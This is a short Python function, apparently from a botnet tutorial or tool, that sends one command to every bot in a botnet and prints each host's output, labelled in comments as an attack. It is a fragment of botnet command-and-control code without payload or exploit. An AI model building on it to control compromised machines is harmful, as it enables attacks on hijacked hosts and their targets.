def command_bots(command, botnet):
    for bot in botnet: # Iterate through botnet
        attack = bot.send_command(command) # Store attack
        print('Output from '+bot.host) # Log output
        print(attack) # Log attempted attack
